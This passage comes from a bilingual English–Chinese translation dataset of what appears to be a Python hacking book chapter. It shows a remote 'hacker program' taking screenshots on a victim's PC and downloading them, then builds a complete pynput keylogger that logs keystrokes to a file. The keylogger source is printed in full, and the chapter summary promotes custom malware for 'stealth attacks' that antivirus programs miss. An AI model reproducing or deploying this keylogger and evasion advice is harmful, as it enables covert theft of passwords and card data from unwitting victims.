  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图7.6 – 受害者程序截取的屏幕截图
- en: 'If you go to the victim''s PC, you will see that a file is saved on the disk
    named **screenshot.png**. You can retrieve this file to the hacker''s PC using
    the method we learned earlier. Just write the following command in the hacker
    program:'
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果你去受害者的PC，你会看到有一个名为**screenshot.png**的文件保存在磁盘上。你可以使用我们之前学到的方法将该文件传输到黑客的PC上。只需在黑客程序中写下以下命令：
- en: '**download screenshot.png**'
  id: totrans-110
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**下载screenshot.png**'
- en: 'This will move the screenshot to the hacker''s PC. I took the following screenshot:'
  id: totrans-111
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这将把屏幕截图移动到黑客的PC上。我截取了以下屏幕截图：
- en: '![Figure 7.7 – Screenshot taken on a Windows PC'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: '![图7.7 – 在Windows PC上截取的屏幕截图'
- en: '](image/B14788_07_07.jpg)'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/B14788_07_07.jpg)'
- en: Figure 7.7 – Screenshot taken on a Windows PC
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 图7.7 – 在Windows PC上截取的屏幕截图
- en: In this section, we have learned how we can take a screenshot of the victim's
    PC using our hacker program and how we can transfer the file over to the hacker's
    PC. In the next section, we will learn how to create a keylogger to keep track
    of the victim's keystrokes.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一部分中，我们学习了如何使用我们的黑客程序截取受害者PC的屏幕截图，并将文件传输到黑客的PC。接下来的部分，我们将学习如何创建一个键盘记录器来追踪受害者的按键记录。
- en: Keylogger
  id: totrans-116
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 键盘记录器
- en: 'In this section, we will build a simple keylogger. A keylogger is a malware
    program that records the keystrokes of the user. It is one of the most common
    kinds of malware programs. Keyloggers are often used to steal passwords and other
    sensitive information, such as credit cards. Keyloggers are often made to be as
    silent as possible, which means that it is very hard to detect keyloggers. Let''s
    try building a simple keylogger. You will need to install a module called **pynput**
    to build a keylogger. This module allows you to access keystrokes programmatically:'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一部分中，我们将构建一个简单的键盘记录器。键盘记录器是一种恶意软件程序，用于记录用户的按键记录。它是最常见的恶意软件类型之一。键盘记录器常用于窃取密码和其他敏感信息，如信用卡信息。键盘记录器通常设计得尽可能安静，这意味着它很难被发现。让我们尝试构建一个简单的键盘记录器。你需要安装一个名为**pynput**的模块来构建键盘记录器。这个模块允许你通过编程方式访问按键记录：
- en: 'To install this module, use the following command:'
  id: totrans-118
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要安装此模块，请使用以下命令：
- en: '**pip install pynput**'
  id: totrans-119
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**pip install pynput**'
- en: 'This will install the module:'
  id: totrans-120
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这将安装模块：
- en: 'Once the module is installed, we can import **keyboard** from this module:'
  id: totrans-121
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦模块安装完成，我们可以从该模块导入**keyboard**：
- en: '**from pynput import keyboard**'
  id: totrans-122
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**from pynput import keyboard**'
- en: 'Next, we will define a listener for listening to keystrokes. This listener
    will handle different cases on different events. Take a look at the following
    code:'
  id: totrans-123
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们将定义一个监听器，用于监听按键记录。这个监听器会根据不同的事件处理不同的情况。看看以下代码：
- en: 'with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:'
  id: totrans-124
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:'
- en: listener.join()
  id: totrans-125
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: listener.join()
- en: The previous code defines two functions for the *press* and *release* of a keystroke.
    When a key is pressed, the **onPress** function will be called, and when a key
    is released, the **onRelease** function will be called.
  id: totrans-126
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 之前的代码定义了两个函数，分别用于*按下*和*释放*按键。当按下一个键时，将调用**onPress**函数，而当释放一个键时，将调用**onRelease**函数。
- en: 'Now we will define these functions. Let''s take a look at the functions:'
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们将定义这些函数。让我们看看这些函数：
- en: 'def onPress(key):'
  id: totrans-128
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'def onPress(key):'
- en: print(str(key))
  id: totrans-129
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: print(str(key))
- en: 'def onRelease(key):'
  id: totrans-130
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'def onRelease(key):'
- en: 'if str(key) == ''Key.esc'':'
  id: totrans-131
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'if str(key) == ''Key.esc'':'
- en: return False
  id: totrans-132
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: return False
- en: 'We have defined very simple functions. When we press the key, we simply print
    it, and when the key is released, we check for which key was pressed. If the pressed
    key was the *Esc* key, we exit the program, otherwise we continue. This way, we
    have an exit condition and don''t get stuck. If we don''t define this condition,
    we can''t exit the program, since pressing *Ctrl* + *C* would simply print it
    instead of exiting. To safely return from this function, we return the **False**
    value. Let''s take a look at a simple execution:'
  id: totrans-133
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们定义了非常简单的函数。当按下键时，我们只需打印它，而当键被释放时，我们会检查按下了哪个键。如果按下的是*Esc*键，我们就退出程序，否则继续。这样，我们就有了退出条件，避免了程序卡住。如果我们没有定义这个条件，就无法退出程序，因为按下*Ctrl*
    + *C*会只是打印出信息，而不是退出。为了安全地退出这个函数，我们返回**False**值。让我们来看一下一个简单的执行过程：
- en: '![Figure 7.8 – Printing pressed keys'
  id: totrans-134
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 7.8 – 打印按下的键'
- en: '](image/B14788_07_08.jpg)'
  id: totrans-135
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B14788_07_08.jpg)'
- en: Figure 7.8 – Printing pressed keys
  id: totrans-136
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 7.8 – 打印按下的键
- en: In this screenshot, we print the keys we pressed during execution of the program.
    When we pressed the *Esc* key, it exited the program. This is all there is to
    a very basic keylogger. However, in practical cases, you will be running this
    program on the victim's machine, so just printing on the console is not very helpful.
    Ideally, we would want to keep a log of these keystrokes. A lot of keyloggers
    store the keystrokes in a file, which hackers can retrieve and see whether any
    password or other sensitive information was typed.
  id: totrans-137
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这张截图中，我们打印了执行程序时按下的键。当我们按下*Esc*键时，程序退出了。这就是一个非常基础的键盘记录器的全部内容。然而，在实际情况下，你会在受害者的机器上运行这个程序，因此仅仅在控制台打印是没有多大用处的。理想情况下，我们希望保留这些按键记录的日志。很多键盘记录器会将按键记录存储到文件中，黑客可以从中查看是否输入了任何密码或其他敏感信息。
- en: Now we will make changes to our keylogger to make it more useful. Let's create
    a new filename, **keylogs.txt**.
  id: totrans-138
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们将对我们的键盘记录器进行一些更改，使其更有用。让我们创建一个新的文件名，**keylogs.txt**。
- en: 'We will store our logs in this file. Let''s take a look at the code:'
  id: totrans-139
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们将把日志存储在这个文件中。让我们来看一下代码：
- en: import sys
  id: totrans-140
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: import sys
- en: filename = "keylogs.txt"
  id: totrans-141
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: filename = "keylogs.txt"
- en: file = open(filename, "w")
  id: totrans-142
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file = open(filename, "w")
- en: 'def onPress(key):'
  id: totrans-143
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'def onPress(key):'
- en: print(str(key))
  id: totrans-144
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: print(str(key))
- en: file.write(str(key))
  id: totrans-145
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write(str(key))
- en: 'def onRelease(key):'
  id: totrans-146
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'def onRelease(key):'
- en: 'if str(key) == ''Key.esc'':'
  id: totrans-147
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'if str(key) == ''Key.esc'':'
- en: file.close()
  id: totrans-148
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.close()
- en: sys.exit(0)
  id: totrans-149
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: sys.exit(0)
- en: 'Here we create a file in write mode and every time a key is pressed, we store
    the key in the file. Finally, when the *Esc* key is pressed, we close the file
    and exit. If you start the program and run it and press some keys, you will see
    that a new file is created, and all the key logs are stored inside the file. Here
    is the result of me executing this operation:'
  id: totrans-150
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这里，我们创建了一个写入模式的文件，每次按下一个键时，我们都会将该键存储到文件中。最后，当按下*Esc*键时，我们关闭文件并退出。如果你启动并运行程序，按下几个键，你会看到创建了一个新文件，所有的按键记录都存储在该文件内。以下是我执行此操作的结果：
- en: '![Figure 7.9 – Stored keystrokes in a file'
  id: totrans-151
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 7.9 – 文件中存储的按键记录'
- en: '](image/B14788_07_09.jpg)'
  id: totrans-152
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/B14788_07_09.jpg)'
- en: Figure 7.9 – Stored keystrokes in a file
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 7.9 – 文件中存储的按键记录
- en: 'You can see in the preceding screenshot that each character has quotation marks
    around it. We can remove these quotation marks for better visibility. In order
    to replace it, we can update the following code:'
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你可以在上面的截图中看到，每个字符周围都有引号。我们可以去掉这些引号以提高可读性。为了替换它，我们可以更新以下代码：
- en: 'def onPress(key):'
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'def onPress(key):'
- en: print(str(key))
  id: totrans-156
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: print(str(key))
- en: stroke = str(key).replace("'", "")
  id: totrans-157
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: stroke = str(key).replace("'", "")
- en: 'if str(key) == "Key.esc":'
  id: totrans-158
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'if str(key) == "Key.esc":'
- en: file.write(" ")
  id: totrans-159
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write(" ")
- en: 'else:'
  id: totrans-160
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'else:'
- en: file.write(stroke)
  id: totrans-161
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write(stroke)
- en: Here, we made two changes. First, we replaced single quotes with empty strings
    before writing them into the file and secondly, if the key is *Esc*, we don't
    write it onto the file. Now, if you run the program, you will see that it only
    registers characters.
  id: totrans-162
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这里，我们做了两个改变。首先，在将它们写入文件之前，我们将单引号替换为空字符串；其次，如果按下的是*Esc*键，我们就不将它写入文件。现在，如果你运行程序，你会看到它只注册字符。
- en: 'If you press any special key, such as *Enter* or *space*, you will see that
    the program registers their name instead of their functionality, which is not
    what we want. We would like to see a space when a user presses the space button.
    To achieve this, we will add the following changes:'
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果你按下任何特殊键，比如*Enter*或*space*，你会看到程序记录的是它们的名称，而不是它们的功能，这不是我们想要的。我们希望用户按下空格键时能看到一个空格。为此，我们将做出以下更改：
- en: 'def onPress(key):'
  id: totrans-164
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'def onPress(key):'
- en: print(str(key))
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: print(str(key))
- en: stroke = str(key).replace("'", "")
  id: totrans-166
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: stroke = str(key).replace("'", "")
- en: 'if str(key) == "Key.space":'
  id: totrans-167
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'if str(key) == "Key.space":'
- en: file.write(" ")
  id: totrans-168
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write(" ")
- en: 'elif str(key) == "Key.enter":'
  id: totrans-169
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'elif str(key) == "Key.enter":'
- en: file.write("\n")
  id: totrans-170
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write("\n")
- en: 'elif str(key) == "Key.esc":'
  id: totrans-171
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'elif str(key) == "Key.esc":'
- en: file.write(" ")
  id: totrans-172
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write(" ")
- en: 'else:'
  id: totrans-173
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'else:'
- en: file.write(stroke)
  id: totrans-174
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write(stroke)
- en: 'Our keylogger is almost complete. We just need to add one final modification.
    Our keylogger doesn''t support backspace. To add this functionality, take a look
    at the following code:'
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们的键盘记录器几乎完成了。我们只需要做一个最后的修改。我们的键盘记录器不支持退格键。为了添加此功能，看看以下代码：
- en: import os
  id: totrans-176
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: import os
- en: 'elif str(key) == "Key.backspace":'
  id: totrans-177
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'elif str(key) == "Key.backspace":'
- en: file.seek(file.tell()-1, os.SEEK_SET)
  id: totrans-178
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.seek(file.tell()-1, os.SEEK_SET)
- en: file.write("")
  id: totrans-179
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write("")
- en: 'This code checks for a backspace, and if we encounter one, we move back one
    character and put an empty string there. This replaces the existing character
    stored on the file. Now, our basic keylogger is complete. It supports character
    insertion, along with the ability to register backspaces as well. The complete
    program for the keylogger is written here:'
  id: totrans-180
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这段代码检查是否有退格键，如果遇到退格键，我们会回退一个字符并在其位置放置一个空字符串。这样就替换了文件中原本存储的字符。现在，我们的基本键盘记录器已经完成。它支持字符插入，并且能够注册退格键的操作。键盘记录器的完整代码如下：
- en: from pynput import keyboard
  id: totrans-181
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: from pynput import keyboard
- en: import sys
  id: totrans-182
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: import sys
- en: import os
  id: totrans-183
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: import os
- en: filename = "keylogs.txt"
  id: totrans-184
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: filename = "keylogs.txt"
- en: file = open(filename, "w")
  id: totrans-185
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file = open(filename, "w")
- en: 'def onPress(key):'
  id: totrans-186
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'def onPress(key):'
- en: print(str(key))
  id: totrans-187
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: print(str(key))
- en: stroke = str(key).replace("'", "")
  id: totrans-188
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: stroke = str(key).replace("'", "")
- en: 'if str(key) == "Key.space":'
  id: totrans-189
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'if str(key) == "Key.space":'
- en: file.write(" ")
  id: totrans-190
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write(" ")
- en: 'elif str(key) == "Key.enter":'
  id: totrans-191
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'elif str(key) == "Key.enter":'
- en: file.write("\n")
  id: totrans-192
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write("\n")
- en: 'elif str(key) == "Key.esc":'
  id: totrans-193
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'elif str(key) == "Key.esc":'
- en: file.write(" ")
  id: totrans-194
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write(" ")
- en: 'elif str(key) == "Key.backspace":'
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'elif str(key) == "Key.backspace":'
- en: file.seek(file.tell()-1, os.SEEK_SET)
  id: totrans-196
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.seek(file.tell()-1, os.SEEK_SET)
- en: file.write("")
  id: totrans-197
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write("")
- en: 'else:'
  id: totrans-198
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'else:'
- en: file.write(stroke)
  id: totrans-199
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.write(stroke)
- en: 'def onRelease(key):'
  id: totrans-200
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'def onRelease(key):'
- en: 'if str(key) == ''Key.esc'':'
  id: totrans-201
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'if str(key) == ''Key.esc'':'
- en: file.close()
  id: totrans-202
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: file.close()
- en: sys.exit(0)
  id: totrans-203
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: sys.exit(0)
- en: 'if __name__ == "__main__":'
  id: totrans-204
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'if __name__ == "__main__":'
- en: 'with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:'
  id: totrans-205
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 'with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:'
- en: listener.join()
  id: totrans-206
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: listener.join()
- en: In this section, we have learned how we can deploy a simple keylogger. Using
    this as a base, you can write a far more advanced keylogger.
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一部分，我们学到了如何部署一个简单的键盘记录器。以此为基础，你可以编写一个更为高级的键盘记录器。
- en: Summary
  id: totrans-208
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we have learned how we can add advanced functionalities to
    our basic malware. First, we added support for file transfer from the victim to
    the client, and then we added additional features, such as taking a screenshot
    from the victim's machine and sending it back to the hacker. Finally, we built
    our own keylogger. Every day, thousands of pieces of malware are written and antivirus
    programs try to keep up with them for detection. The advantage of writing your
    own malware is that it will not be easy and detect them programs to detect this
    malware since it is written by you and does not yet exist in antivirus databases.
    This gives you the opportunity for a more successful attack. Using the tools we
    developed in this chapter will give you an understanding of how you can build
    more advanced malware and how you can add more features to it as you wish. The
    skills gained by writing your custom malware will give you opportunities for more
    stealth attacks and less detection by antivirus programs.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一章中，我们学到了如何为我们的基础恶意软件添加高级功能。首先，我们添加了受害者到客户端的文件传输支持，接着我们添加了其他功能，如从受害者的计算机截屏并将其发送回黑客。最后，我们编写了自己的键盘记录器。每天，成千上万的恶意软件被编写出来，防病毒程序尝试跟上这些软件的检测进度。编写你自己的恶意软件的优势在于，它不容易被检测程序发现，因为它是你自己编写的，还不存在于防病毒数据库中。这为你提供了更成功的攻击机会。使用我们在本章开发的工具，你将理解如何构建更高级的恶意软件，并且你可以根据需要为它添加更多功能。通过编写自定义恶意软件所获得的技能将为你提供更多隐秘攻击的机会，并减少防病毒程序的检测。
- en: In the next chapter, we will see how we can package our code into a single executable
    and how we can use it for hacking purposes. See you in the next chapter!
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章，我们将看到如何将我们的代码打包成一个独立的可执行文件，并如何将其用于黑客攻击。下一章见！
